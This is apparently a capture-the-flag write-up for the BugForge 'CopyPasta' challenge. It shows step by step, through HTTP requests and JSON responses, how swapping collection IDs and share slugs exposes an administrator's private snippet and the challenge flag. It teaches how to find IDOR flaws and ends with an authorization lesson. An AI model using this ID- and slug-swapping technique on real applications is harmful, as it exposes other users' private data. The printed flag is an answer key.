# CopyPasta — copypasta-009 — Slugs are useful.

## Challenge Information

* **Challenge:** CopyPasta
* **Platform:** BugForge
* **Category:** Broken Access Control / IDOR
* **Difficulty:** Easy
* **Hint:** `Slugs are useful.`

---

## 1. Challenge Overview

CopyPasta is a web application that allows users to create and share code snippets and collections of snippets.

The application provides:

* User registration/login
* Code snippets
* Public snippets
* Collections
* Collection sharing through a UUID-based slug

The objective is to discover a broken access-control vulnerability and retrieve the flag.

---

## 2. Initial Reconnaissance

After registering a test account, I created a snippet.

### Create Snippet

```http
POST /api/snippets
Authorization: Bearer <JWT>
Content-Type: application/json
```

Request:

```json
{
  "title": "Test Snippet",
  "code": "print(\"Test Snippet\")",
  "language": "python",
  "description": "This is a test snippet.",
  "is_public": true
}
```

The server returned:

```json
{
  "id": 10,
  "share_code": "6f38749c-3676-4868-a660-be884832ebbf",
  "message": "Snippet created successfully"
}
```

---

## 3. Inspecting Public Snippets

The public snippets endpoint was:

```http
GET /api/snippets/public
```

The response exposed information such as:

* Snippet ID
* User ID
* Username
* `share_code`
* `is_public`
* Code
* Description

Among the results was an administrator's snippet:

```json
{
  "id": 7,
  "user_id": 1,
  "title": "SQL Query Example",
  "username": "admin",
  "is_public": 1,
  "share_code": "887b5de0-adf7-4ce8-a92d-0f7e41978ea4"
}
```

---

## 4. Testing the Snippet Share Endpoint

The snippet share endpoint was:

```http
GET /api/snippets/share/<share_code>
```

I replaced my own `share_code` with the administrator's public snippet share code:

```http
GET /api/snippets/share/887b5de0-adf7-4ce8-a92d-0f7e41978ea4
```

The endpoint returned the administrator's snippet.

This showed that the share code could be used to access a snippet without ownership of the snippet.

However, the snippet itself was already public, so this was not yet the interesting vulnerability.

---

## 5. Discovering Collections

The application also allowed users to create collections.

### Create Collection

```http
POST /api/collections
Authorization: Bearer <JWT>
Content-Type: application/json
```

Request:

```json
{
  "name": "Test Collection",
  "description": "This is a Test Collection",
  "is_public": true
}
```

Response:

```json
{
  "id": 4,
  "slug": "a12d7410-a815-43e3-9aa7-9b9b3efb99e8",
  "message": "Collection created successfully"
}
```

The presence of a UUID **slug** was interesting because the challenge hint was:

> `Slugs are useful.`

---

## 6. Testing Collection Access Control

Opening my collection generated:

```http
GET /api/collections/4
```

I then changed the collection ID to another collection:

```http
GET /api/collections/1
```

The server returned another user's collection.

I also tested:

```http
GET /api/collections/2
```

which returned the administrator's collection:

```json
{
  "collection": {
    "id": 2,
    "user_id": 1,
    "name": "Admin Toolbox",
    "is_public": 1,
    "slug": "a631098f-b2ee-4cf7-bed1-a26fdf749cca",
    "username": "admin"
  }
}
```

The collection contained an administrator-owned snippet.

Since the collection was public, this alone did not reveal the flag.

---

## 7. Following the Slug Hint

The collection had a sharing feature.

My collection generated the URL:

```text
/collections/share/a12d7410-a815-43e3-9aa7-9b9b3efb99e8
```

This revealed the corresponding API endpoint:

```http
GET /api/collections/share/<slug>
```

The administrator's collection had the slug:

```text
a631098f-b2ee-4cf7-bed1-a26fdf749cca
```

Therefore, I requested:

```http
GET /api/collections/share/a631098f-b2ee-4cf7-bed1-a26fdf749cca
```

---

## 8. Exploiting Broken Access Control

The server returned the administrator's entire collection, including a snippet marked as private.

The important part of the response was:

```json
{
  "id": 8,
  "user_id": 1,
  "title": "prod.env (internal)",
  "language": "bash",
  "description": "Production environment notes — do not share",
  "is_public": 0,
  "share_code": "1f1e7711-aca6-43dc-9785-047eb3a0b18c"
}
```

The snippet contained:

```text
# CopyPasta production — keep this private
DATABASE_URL=postgres://cp_app:<REDACTED>@db.internal:5432/copypasta
ADMIN_NOTES=rotate the load-balancer cert before the July audit
INTERNAL_DASHBOARD=https://ops.internal/copypasta
```

Most importantly, the API response also contained the challenge flag.

---

## 9. Flag

```text
bug{OIEvW1Fc0Wd7Xve4vh2C6qbboH7xLsG6}
```

---

## 10. Vulnerability Analysis

The primary vulnerability is **Broken Access Control / IDOR**.

The vulnerable endpoint was:

```http
GET /api/collections/share/<slug>
```

The application trusted the collection's slug as sufficient authorization to retrieve the collection.

It failed to verify whether the requesting user was authorized to access the collection and its snippets.

As a result:

```text
Attacker
   |
   | Own collection slug
   v
/collections/share/<attacker-slug>
   |
   | Replace slug
   v
/collections/share/<admin-slug>
   |
   v
Admin Toolbox
   |
   +-- Public snippet
   |
   +-- Private snippet
          |
          +-- Flag
```

The critical authorization failure was that the endpoint exposed a snippet with:

```json
"is_public": 0
```

through a collection share endpoint.

---

## 11. Key Lesson

When testing web applications with object-sharing functionality, don't only test numeric IDs.

Look for alternate identifiers such as:

* IDs
* UUIDs
* Slugs
* Share codes
* Usernames
* File names
* Public tokens

A resource may have proper authorization on one endpoint while another endpoint exposes the same resource without performing the required authorization checks.

In this challenge, the hint:

> **"Slugs are useful."**

pointed directly toward the collection's share slug and ultimately led to the flag.

## Final Result

**Vulnerability:** Broken Access Control / IDOR

**Attack Vector:** Collection share slug

**Vulnerable Endpoint:**

```http
GET /api/collections/share/<slug>
```

**Flag:**

```text
bug{OIEvW1Fc0Wd7Xve4vh2C6qbboH7xLsG6}
```